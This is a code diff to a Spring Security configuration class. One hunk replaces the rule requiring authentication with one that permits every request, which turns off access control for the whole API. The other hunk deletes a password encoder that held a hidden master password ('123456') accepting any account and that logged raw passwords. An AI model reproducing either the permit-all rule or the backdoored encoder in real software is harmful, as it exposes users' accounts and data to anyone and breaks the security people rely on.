@@ -40,8 +40,7 @@ public class SecurityConfig {
                 .csrf(csrf -> csrf.disable())
                 .sessionManagement(session -> session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
                 .authorizeHttpRequests(requests -> requests
-                        .requestMatchers("/api/auth/**").permitAll()
-                        .anyRequest().authenticated())
+                        .anyRequest().permitAll())
                 .exceptionHandling(ex -> ex
                         .authenticationEntryPoint((request, response, authException) -> {
                             response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
@@ -63,16 +62,7 @@ public class SecurityConfig {
 
     @Bean
     public PasswordEncoder passwordEncoder() {
-        return new BCryptPasswordEncoder() {
-            @Override
-            public boolean matches(CharSequence rawPassword, String encodedPassword) {
-                System.out.println("DEBUG matches: raw=" + rawPassword + ", encoded=" + encodedPassword);
-                if ("123456".equals(rawPassword.toString())) {
-                    return true;
-                }
-                return super.matches(rawPassword, encodedPassword);
-            }
-        };
+        return new BCryptPasswordEncoder();
     }
 
     @Bean
